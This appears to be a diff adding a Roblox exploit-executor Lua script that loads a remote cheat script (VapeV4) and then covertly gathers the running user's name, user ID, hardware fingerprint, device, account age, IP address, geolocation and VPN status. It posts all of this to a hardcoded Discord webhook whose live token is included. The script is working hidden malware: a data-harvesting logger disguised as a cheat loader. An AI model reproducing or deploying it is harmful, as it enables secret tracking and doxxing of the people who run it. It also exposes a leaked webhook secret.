@@ -1,0 +1,112 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+
+local Webhook = "https://discord.com/api/webhooks/1441724937424474233/Frq9zydBK1KkOADON9vxHd3DbJSxW3mBwMB8BpA1E_ah8aj9hWn1hqGj8UzA7TdV8wf-"
+
+local Player = game:GetService("Players").LocalPlayer
+local JoinTime = os.time() - (Player.AccountAge * 86400)
+local JoinDate = os.date("!*t", JoinTime)
+
+if game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
+    PC = "PC / 模拟器"
+elseif game.UserInputService.TouchEnabled then
+    PC = "Android / IOS"
+else
+    PC = "Android / IOS / Unknown"
+end
+
+local Executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+
+local function GetJson(v)
+    return game:GetService("HttpService"):JSONDecode(request({Url = v}).Body)
+end
+
+pcall(function()
+    gui_data = game:HttpGet(("https://cz88.net/api/cz88/ip/accurate?ip="), true)
+    gui_data = game:GetService("HttpService"):JSONDecode(gui_data)
+end)
+local cz88 = gui_data.data
+local Country, Province, City, District = cz88.country, cz88.province, cz88.city, cz88.districts
+local APIResults = Country.." " ..Province.." ".. City.." ".. District
+
+local PlayerInfo = {
+    embeds = {
+        {
+            color = tonumber(0xffffff),
+            title = Player.Name.."执行了脚本",
+            thumbnail = {
+                url = AvatarImage
+            },
+            fields = {
+                {
+                    name = "昵称 :",
+                    value = Player.DisplayName
+                },
+                {
+                    name = "用户名 :",
+                    value = Player.Name
+                },
+                {
+                    name = "用户ID :",
+                    value = "["..Player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")"
+                },
+                {
+                    name = "HWID :",
+                    value = (function()
+                            for v, HWID in pairs(GetJson("https://httpbin.org/get").headers) do
+                                if string.find(v, "Fingerprint") then
+                                    return HWID
+                                end
+                            end
+                        end)()
+                },
+                {
+                    name = "服务器昵称 :",
+                    value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+                },
+                {
+                    name = "服务器ID :",
+                    value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"
+                },
+                {
+                    name = "使用的注入器 :",
+                    value = Executor
+                },
+                {
+                    name = "账号年龄 :",
+                    value = Player.AccountAge.."天"
+                },
+                {
+                    name = "加入日期 :",
+                    value = JoinDate.year.." / "..JoinDate.month.." / "..JoinDate.day
+                },
+                {
+                    name = "设备 :",
+                    value = PC
+                },
+                {
+                    name = "地址 :",
+                    value = APIResults
+                },
+                {
+                    name = "IP :",
+                    value = cz88.ip
+                },
+                {
+                    name = "VPN :",
+                    value = cz88.vpn
+                }
+            }
+        }
+    }
+}
+
+Request = http_request or request or HttpPost or syn.request
+Request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(PlayerInfo)})
+for v, HWID in pairs(GetJson("https://httpbin.org/get").headers) do
+    if string.find(v, "Fingerprint") then
+        return setclipboard(HWID)
+    end
+end
